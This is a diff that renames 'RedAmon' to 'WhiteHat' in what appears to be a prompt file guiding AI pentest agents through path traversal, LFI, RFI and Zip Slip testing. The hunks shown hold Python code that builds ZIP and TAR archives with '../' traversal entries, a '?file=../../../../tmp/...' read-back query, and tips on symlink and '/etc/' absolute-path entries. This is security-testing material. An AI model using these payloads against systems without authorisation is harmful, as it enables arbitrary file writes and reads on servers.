@@ -1,5 +1,5 @@
 """
-RedAmon Path Traversal / LFI / RFI Prompts
+WhiteHat Path Traversal / LFI / RFI Prompts
 
 Black-box workflows for path traversal, Local File Inclusion (LFI), Remote
 File Inclusion (RFI), and archive-extraction (Zip Slip) testing.
@@ -9,7 +9,7 @@ Synthesis:
   encoding/normalization bypasses, false-positive hints, OS-specific paths.
 - Shannon vuln-injection.txt: OWASP-aligned phase flow (oracle -> confirmation
   -> escalation -> impact), proof-level rigor, false-positive gate. White-box
-  / source-trace / deliverable-CLI instructions are stripped -- RedAmon agents
+  / source-trace / deliverable-CLI instructions are stripped -- WhiteHat agents
   have no source-code access.
 
 The prompt is parameterised by 5 project-level knobs that gate wrapper
@@ -1016,8 +1016,8 @@ workflow:
 # language: python
 import zipfile
 
-MARKER = '../../../../tmp/redamon_zipslip_proof.txt'
-content = b'REDAMON_ZIPSLIP_OK\\n'
+MARKER = '../../../../tmp/whitehat_zipslip_proof.txt'
+content = b'WHITEHAT_ZIPSLIP_OK\\n'
 
 with zipfile.ZipFile('/tmp/zipslip.zip', 'w', zipfile.ZIP_STORED) as z:
     # Benign filler so the archive opens cleanly in a viewer
@@ -1034,8 +1034,8 @@ For TAR / TGZ:
 # language: python
 import io, tarfile
 
-buf = io.BytesIO(b'REDAMON_TARSLIP_OK\\n')
-ti = tarfile.TarInfo('../../../../tmp/redamon_tarslip_proof.txt')
+buf = io.BytesIO(b'WHITEHAT_TARSLIP_OK\\n')
+ti = tarfile.TarInfo('../../../../tmp/whitehat_tarslip_proof.txt')
 ti.size = len(buf.getvalue())
 
 with tarfile.open('/tmp/tarslip.tar', 'w') as t:
@@ -1062,10 +1062,10 @@ upload is gated by a multi-step UI flow.
 If you have an existing path-traversal sink, read it back:
 
 ```
-?file=../../../../tmp/redamon_zipslip_proof.txt
+?file=../../../../tmp/whitehat_zipslip_proof.txt
 ```
 
-If the response body contains `REDAMON_ZIPSLIP_OK`, the extractor wrote
+If the response body contains `WHITEHAT_ZIPSLIP_OK`, the extractor wrote
 outside the destination directory -- Zip Slip confirmed.
 
 If you do NOT have a path-traversal read sink to verify, look for indirect
@@ -1087,7 +1087,7 @@ You wrote a file to the target filesystem. Remove it before finishing:
   can hand the extractor a write-anywhere primitive even when path normalisation
   blocks `../`. Test by adding `tarfile.SYMTYPE` entries.
 - Absolute-path entries: some extractors ignore leading `/`; some honour it.
-  Add `/etc/redamon_check` entries alongside the `../` form to cover both.
+  Add `/etc/whitehat_check` entries alongside the `../` form to cover both.
 - 7z / RAR: the archive format matters when the backend uses a specific
   extractor library; if ZIP fails, retry with TGZ and 7z.
 """
